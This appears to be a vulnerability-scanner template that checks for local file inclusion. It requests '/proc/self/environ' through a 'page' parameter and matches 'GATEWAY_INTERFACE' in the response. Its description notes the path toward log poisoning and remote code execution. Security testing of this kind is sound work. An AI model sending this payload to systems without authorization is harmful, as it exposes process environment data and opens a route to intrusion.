id: patt-lfi-proc-01-page
name: 'PATT lfi patt-lfi-proc-01 via page'
severity: high
type: active
tags:
  - lfi
  - patt
requires:
  - php
  - python
  - node
description: 'PATT Linux Files: environ (jalan ke log-poisoning/RCE). [patt:patt-lfi-proc-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/README.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - '/proc/self/environ'
    matchers:
      - type: word
        part: body
        words:
          - 'GATEWAY_INTERFACE'
